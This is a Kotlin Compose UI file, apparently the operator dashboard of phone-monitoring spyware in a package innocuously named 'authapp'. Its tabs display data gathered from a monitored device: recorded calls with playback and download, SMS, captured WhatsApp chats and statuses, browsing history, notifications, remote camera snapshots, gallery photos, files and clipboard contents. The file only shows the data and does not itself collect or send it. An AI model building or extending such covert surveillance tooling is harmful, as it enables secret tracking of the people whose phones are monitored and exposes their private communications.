package com.example.authapp.ui.components

import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyRow
import androidx.compose.foundation.lazy.items
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp
import com.example.authapp.data.*

@Composable
fun ActivityTabContent(
    selectedTab: Int,
    searchQuery: String,
    filteredCallLogs: List<CallLogItem>,
    filteredSmsLogs: List<SmsItem>,
    filteredWhatsAppLogs: List<WhatsAppLogItem>,
    whatsAppLogs: List<WhatsAppLogItem>,
    whatsAppContacts: List<String>,
    whatsAppFilterType: String,
    onWhatsAppFilterChange: (String) -> Unit,
    selectedWhatsAppContact: String?,
    onWhatsAppContactChange: (String?) -> Unit,
    filteredWebHistory: List<WebHistoryItem>,
    filteredPackageEvents: List<AppInstallEvent>,
    filteredNotifications: List<NotificationItem>,
    filteredSnapshots: List<SnapshotInfo>,
    filteredGallery: List<MediaGalleryItem>,
    filteredFileExplorer: List<FileExplorerItem>,
    filteredClipboardLogs: List<ClipboardLogItem>,
    simInfo: SimCardInfo?,
    networkHistory: List<NetworkHistoryItem>,
    currentlyPlayingAudioUrl: String?,
    isAudioBuffering: Boolean,
    audioPositionMs: Int,
    audioDurationMs: Int,
    audioPlaybackSpeed: Float,
    onSpeedToggle: () -> Unit,
    onPlayAudio: (String) -> Unit,
    onSeekTo: (Int) -> Unit = {},
    onForward: () -> Unit = {},
    onRewind: () -> Unit = {},
    onDownloadAudio: (String, String) -> Unit = { _, _ -> },
    onSelectGalleryItem: (MediaGalleryItem) -> Unit,
    onSelectFileItem: (FileExplorerItem) -> Unit
) {
    Box(modifier = Modifier.fillMaxSize()) {
        when (selectedTab) {
            0 -> {
                ActivityTabList(
                    items = filteredCallLogs,
                    emptyIcon = Icons.Default.Call,
                    emptySearchMessage = "No matching calls found",
                    emptyDefaultMessage = "No call logs recorded yet",
                    isSearching = searchQuery.isNotEmpty()
                ) { log ->
                    CallLogListItem(
                        log = log,
                        isPlaying = currentlyPlayingAudioUrl == log.audioRecordingUrl && log.audioRecordingUrl.isNotEmpty(),
                        isBuffering = isAudioBuffering,
                        audioPositionMs = audioPositionMs,
                        audioDurationMs = audioDurationMs,
                        playbackSpeed = audioPlaybackSpeed,
                        onSpeedToggle = onSpeedToggle,
                        onPlayClick = {
                            if (log.audioRecordingUrl.isNotEmpty()) {
                                onPlayAudio(log.audioRecordingUrl)
                            }
                        },
                        onSeekTo = onSeekTo,
                        onForward = onForward,
                        onRewind = onRewind,
                        onDownloadClick = {
                            if (log.audioRecordingUrl.isNotEmpty()) {
                                val caller = log.name.ifEmpty { log.number.ifEmpty { "Call" } }
                                onDownloadAudio(log.audioRecordingUrl, "Call_${caller}_${log.timestamp}.m4a")
                            }
                        }
                    )
                }
            }
            1 -> {
                ActivityTabList(
                    items = filteredSmsLogs,
                    emptyIcon = Icons.Default.Email,
                    emptySearchMessage = "No matching SMS messages found",
                    emptyDefaultMessage = "No SMS messages recorded yet",
                    isSearching = searchQuery.isNotEmpty()
                ) { sms ->
                    SmsListItem(sms)
                }
            }
            2 -> {
                Column(modifier = Modifier.fillMaxSize()) {
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(bottom = 6.dp),
                        horizontalArrangement = Arrangement.spacedBy(6.dp)
                    ) {
                        FilterChip(
                            selected = whatsAppFilterType == "ALL",
                            onClick = { onWhatsAppFilterChange("ALL") },
                            label = { Text("All (${whatsAppLogs.size})", style = MaterialTheme.typography.labelSmall) }
                        )
                        FilterChip(
                            selected = whatsAppFilterType == "CHATS",
                            onClick = { onWhatsAppFilterChange("CHATS") },
                            label = { Text("💬 Chats", style = MaterialTheme.typography.labelSmall) }
                        )
                        FilterChip(
                            selected = whatsAppFilterType == "STATUS",
                            onClick = { onWhatsAppFilterChange("STATUS") },
                            label = { Text("📸 Statuses", style = MaterialTheme.typography.labelSmall) }
                        )
                        FilterChip(
                            selected = whatsAppFilterType == "MEDIA",
                            onClick = { onWhatsAppFilterChange("MEDIA") },
                            label = { Text("🎙️ Media", style = MaterialTheme.typography.labelSmall) }
                        )
                    }

                    if (whatsAppContacts.isNotEmpty()) {
                        LazyRow(
                            modifier = Modifier
                                .fillMaxWidth()
                                .padding(bottom = 8.dp),
                            horizontalArrangement = Arrangement.spacedBy(6.dp)
                        ) {
                            item {
                                FilterChip(
                                    selected = selectedWhatsAppContact == null,
                                    onClick = { onWhatsAppContactChange(null) },
                                    label = { Text("All Contacts", style = MaterialTheme.typography.labelSmall) }
                                )
                            }
                            items(whatsAppContacts) { contact ->
                                val msgCount = whatsAppLogs.count { (it.senderName.ifEmpty { "WhatsApp User" }).equals(contact, ignoreCase = true) }
                                FilterChip(
                                    selected = selectedWhatsAppContact == contact,
                                    onClick = { onWhatsAppContactChange(if (selectedWhatsAppContact == contact) null else contact) },
                                    label = { Text("👤 $contact ($msgCount)", style = MaterialTheme.typography.labelSmall) }
                                )
                            }
                        }
                    }

                    ActivityTabList(
                        items = filteredWhatsAppLogs,
                        emptyIcon = Icons.Default.Chat,
                        emptySearchMessage = "No matching WhatsApp logs found",
                        emptyDefaultMessage = "No WhatsApp chats or status captured yet",
                        isSearching = searchQuery.isNotEmpty()
                    ) { waItem ->
                        WhatsAppListItem(waItem)
                    }
                }
            }
            3 -> {
                ActivityTabList(
                    items = filteredWebHistory,
                    emptyIcon = Icons.Default.Language,
                    emptySearchMessage = "No matching web history found",
                    emptyDefaultMessage = "No web browsing history yet",
                    isSearching = searchQuery.isNotEmpty()
                ) { item ->
                    WebHistoryListItem(item)
                }
            }
            4 -> {
                ActivityTabList(
                    items = filteredPackageEvents,
                    emptyIcon = Icons.Default.Apps,
                    emptySearchMessage = "No matching app events found",
                    emptyDefaultMessage = "No app install/uninstall events yet",
                    isSearching = searchQuery.isNotEmpty()
                ) { event ->
                    AppInstallEventItem(event)
                }
            }
            5 -> {
                UnifiedSimAndNetworkView(simInfo = simInfo, networkHistory = networkHistory)
            }
            6 -> {
                ActivityTabList(
                    items = filteredNotifications,
                    emptyIcon = Icons.Default.Notifications,
                    emptySearchMessage = "No matching notifications found",
                    emptyDefaultMessage = "No notifications captured yet",
                    isSearching = searchQuery.isNotEmpty()
                ) { notif ->
                    NotificationListItem(notif)
                }
            }
            7 -> {
                ActivityTabList(
                    items = filteredSnapshots,
                    emptyIcon = Icons.Default.CameraAlt,
                    emptySearchMessage = "No matching camera snapshots",
                    emptyDefaultMessage = "No remote camera snapshots taken yet",
                    isSearching = searchQuery.isNotEmpty()
                ) { snap ->
                    SnapshotGridItem(snap)
                }
            }
            8 -> {
                ActivityTabList(
                    items = filteredGallery,
                    emptyIcon = Icons.Default.PhotoLibrary,
                    emptySearchMessage = "No matching gallery media",
                    emptyDefaultMessage = "No local gallery photos or videos synced yet",
                    isSearching = searchQuery.isNotEmpty()
                ) { media ->
                    MediaGalleryCardItem(
                        media = media,
                        onClick = { onSelectGalleryItem(media) }
                    )
                }
            }
            9 -> {
                ActivityTabList(
                    items = filteredFileExplorer,
                    emptyIcon = Icons.Default.Folder,
                    emptySearchMessage = "No matching files found",
                    emptyDefaultMessage = "No files or storage items synced yet",
                    isSearching = searchQuery.isNotEmpty()
                ) { file ->
                    FileExplorerCardItem(
                        file = file,
                        onClick = { onSelectFileItem(file) }
                    )
                }
            }
            10 -> {
                ActivityTabList(
                    items = filteredClipboardLogs,
                    emptyIcon = Icons.Default.ContentCopy,
                    emptySearchMessage = "No matching copied messages",
                    emptyDefaultMessage = "No copied text recorded yet",
                    isSearching = searchQuery.isNotEmpty()
                ) { clip ->
                    ClipboardListItem(clip)
                }
            }
        }
    }
}
